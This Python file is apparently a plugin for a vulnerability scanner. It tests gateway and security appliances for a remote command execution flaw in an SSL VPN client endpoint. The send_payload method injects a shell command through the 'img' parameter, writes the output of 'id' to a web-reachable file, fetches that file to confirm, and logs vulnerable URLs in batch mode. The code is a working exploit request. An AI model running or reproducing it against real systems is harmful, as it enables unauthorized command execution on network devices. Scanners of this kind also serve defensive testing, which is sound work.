#! /usr/bin/python3
# -*- encoding: utf-8 -*-
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
import requests
import urllib3
urllib3.disable_warnings()
class WangGuan_Rce_Scan:
    def __init__(self):
        self.header = None
        self.proxy = None

    def send_payload(self,url):
        url2 = url + '/sslvpn/sslvpn_client.php?client=logoImg&img=%20/tmp%7Cecho%20%60id%60%20%7Ctee%20/usr/local/webui/sslvpn/csvuls.txt'
        url3 = url + '/sslvpn/csvuls.txt'
        try:
            req = requests.get(url2, timeout=3,verify=self.verify,proxies=self.proxy,headers=self.header)
            req2 = requests.get(url3, timeout=3,verify=self.verify,proxies=self.proxy,headers=self.header)
            if "uid=" in req2.text:
                if not self.batch:
                    OutPrintInfoSuc("WangGuan", f"存在多家网关-安全设备远程命令执行漏洞")
                    OutPrintInfo("WangGuan", url2)
                    OutPrintInfo("WangGuan", url3)
                else:
                    OutPrintInfoSuc("WangGuan", f"存在多家网关-安全设备远程命令执行漏洞 {url3}")
                    with open("./result/wangguan_rce.txt","a") as w:
                        w.write(f"{url3}\n")
        except Exception:
            if not self.batch:
                OutPrintInfo("WangGuan", "目标请求出错")
            return
    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        self.verify = target["ssl"]
        header = target["header"]
        proxy = target["proxy"]
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("WangGuan", "开始检测多家网关-安全设备远程命令执行漏洞...")
        self.send_payload(url)
        if not self.batch:
            OutPrintInfo("WangGuan", "多家网关-安全设备远程命令执行漏洞检测结束")
